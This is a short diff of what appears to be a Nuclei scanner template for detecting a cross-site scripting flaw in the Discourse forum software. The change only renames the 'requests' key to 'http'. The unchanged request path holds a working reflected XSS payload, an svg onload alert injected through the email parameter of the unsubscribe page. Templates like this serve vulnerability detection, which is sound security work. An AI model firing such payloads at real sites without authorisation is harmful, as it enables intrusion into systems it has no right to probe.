@@ -7,7 +7,7 @@ info:
   description: Cross-site scripting (XSS) on Discourse CMS
   tags: xss,discourse
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(xss)%3E'
